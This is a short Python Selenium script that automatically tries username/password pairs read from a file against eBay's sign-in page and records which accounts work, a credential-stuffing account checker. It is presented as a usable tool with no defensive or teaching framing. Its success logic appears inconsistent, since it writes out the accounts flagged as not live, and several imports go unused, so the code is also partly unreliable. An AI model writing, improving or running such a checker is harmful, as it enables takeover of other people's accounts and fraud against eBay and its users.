from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool 
from selenium.common.exceptions import NoSuchElementException
import argparse


username_selector = '#userid'
password_selector = '#pass'
submit_button_selector ='#sgnBt'
button_remember_selector = '#csi'
login_url = 'https://signin.ebay.com/ws/eBayISAPI.dll'
logoff_url = 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&lgout=1'
fall_selector = '#errf'

def load_accounts():
    with open('Email-Ebay-check.txt') as f:
        return f.readlines()

def check_account(username, password, driver):
    username_element = driver.find_element_by_css_selector(username_selector)
    password_element = driver.find_element_by_css_selector(password_selector)
    button_remember_element = driver.find_element_by_css_selector(button_remember_selector)
    submit_element = driver.find_element_by_css_selector(submit_button_selector)
    try:
        username_element.clear()
        username_element.send_keys(username)
        password_element.clear()
        password_element.send_keys(password)
        button_remember_element.click()
        submit_element.submit()
        error_element = driver.find_element_by_css_selector(fall_selector)
        return False
    except Exception:
        driver.get(logoff_url)
        driver.get(login_url)
        return True
    
    

def main():
    accounts = [{"username":item.split('/')[0],"password":item.split('/')[1],"live":False} for item in load_accounts()]
    driver = webdriver.Chrome('chromedriver.exe')
    driver.get(login_url)
    for account in accounts:
        result = check_account(account["username"],account["password"],driver)
        if result == True:
            account["live"] = True
    driver.quit()
    result = [x['username']+'/'+x['password'] for x in accounts if x["live"] == False]
    with open('result.txt','w') as f:
        f.writelines(result)
if __name__ == '__main__':
    main()
    
